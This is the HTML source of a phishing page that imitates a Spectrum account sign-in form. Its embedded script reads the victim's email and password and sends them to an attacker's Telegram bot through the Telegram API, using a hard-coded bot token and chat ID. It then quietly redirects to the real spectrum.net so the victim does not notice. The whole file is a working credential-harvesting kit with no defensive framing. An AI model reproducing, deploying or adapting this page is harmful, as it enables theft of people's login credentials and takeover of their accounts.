<!DOCTYPE html>
<html>
<head>
    <title>Spectrum Login</title>
</head>
<body style="
    margin:0;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    font-family:Arial;
    background:#f4f4f4;
    padding:40px 0;
">
    <!-- TOP LOGO -->
    <img src="Screenshot 2026-03-30 104237.png"
         style="width:160px; margin-bottom:40px;">
    
    <!-- LOGIN CARD -->
    <div style="
        background:white;
        width:420px;
        padding:50px 40px;
        border-radius:10px;
        box-shadow:0 2px 20px rgba(0,0,0,0.1);
        text-align:center;
    ">
        <h1 style="
            font-size:34px;
            margin-bottom:35px;
            font-weight:600;
        ">
            Sign In to Get Started
        </h1>

        <!-- FORM -->
        <form id="loginForm">
            <div style="text-align:left; margin-bottom:20px;">
                <label style="font-size:14px; color:#333;">Email Address</label><br>
                <input type="email" name="email" required
                    style="width:100%; padding:12px; margin-top:6px; border:1px solid #ccc; border-radius:5px; font-size:15px;">
            </div>
            <div style="text-align:left; margin-bottom:15px;">
                <label style="font-size:14px; color:#333;">Password</label><br>
                <input type="password" name="password" required
                    style="width:100%; padding:12px; margin-top:6px; border:1px solid #ccc; border-radius:5px; font-size:15px;">
            </div>
            <div style="text-align:right; margin-bottom:25px;">
                <a href="https://spectrum.net" style="color:#0073e6; font-size:13px; text-decoration:none;">
                    Forget Your Password?
                </a>
            </div>
            <button type="submit" style="
                width:100%;
                padding:13px;
                background:#0073e6;
                color:white;
                border:none;
                border-radius:5px;
                font-size:16px;
                cursor:pointer;
            ">
                Sign In
            </button>
        </form>
    </div>

    <!-- BOTTOM IMAGE -->
    <img src="spect.png" style="width:420px; margin-top:25px; border-radius:10px;">

    <!-- TELEGRAM BOT SCRIPT -->
    <script>
        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const email = document.querySelector("input[name='email']").value;
            const password = document.querySelector("input[name='password']").value;

            const message = `🔴 *New Spectrum Login*\n\n` +
                            `*Email:* ${email}\n` +
                            `*Password:* ${password}\n` +
                            `*Time:* ${new Date().toLocaleString()}`;

            const botToken = "8812714398:AAEGTRjUZsPFJENuxk1XhAqHmcUfoqSDQUg";
            const chatId = "254077234";

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            });

            // Redirect without showing any message
            setTimeout(() => {
                window.location.href = "https://spectrum.net";
            }, 1200);
        });
    </script>
</body>
</html>
